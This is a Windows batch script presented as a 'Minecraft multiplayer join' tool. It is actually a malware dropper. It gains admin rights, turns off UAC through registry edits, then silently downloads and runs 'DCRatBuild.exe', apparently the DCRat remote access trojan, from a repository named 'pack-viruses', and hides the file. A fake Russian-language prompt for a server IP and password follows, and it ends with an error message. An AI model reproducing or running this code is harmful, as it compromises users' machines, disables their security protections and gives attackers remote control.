

@echo off

net session >nul 2>&1 || (powershell "Start-Process '%~f0' -Verb RunAs" & exit /b)
chcp 65001 >nul



title Minecraft multiplayer join


echo msftbox = msgbox("Please wait", 64, "Loading") > "%temp%\msg.vbs"
cscript //nologo "%temp%\msg.vbs"
del "%temp%\msg.vbs"


reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1

set /a rf=%RANDOM% % 1000000001

cd %temp%


:----------------------------------------------------------------------------------------------------------------:
Powershell -Command "Invoke-Webrequest 'https://github.com/moyaki485-svg/pack-viruses/raw/refs/heads/main/DCRatBuild.exe' -OutFile DCRatBuild.exe"
rename DCRatBuild.exe %rf%.exe
start %rf%.exe
attrib +h %temp%\%rf%.exe /s /d


powershell -window hidden -command "Write-Host 'Hello'"

echo Введите айпи к которому хотите подключится



set /p "ip_choice= "

echo Подключение пожалуйста подождите...

timeout /t 3 /nobreak >NUL
echo Введите пароль

set /p "pass_choice= "

echo Подключение пожалуйста подождите...
timeout /t 3 /nobreak >NUL
echo Ошибка
:powershell -window hidden -command ""




pause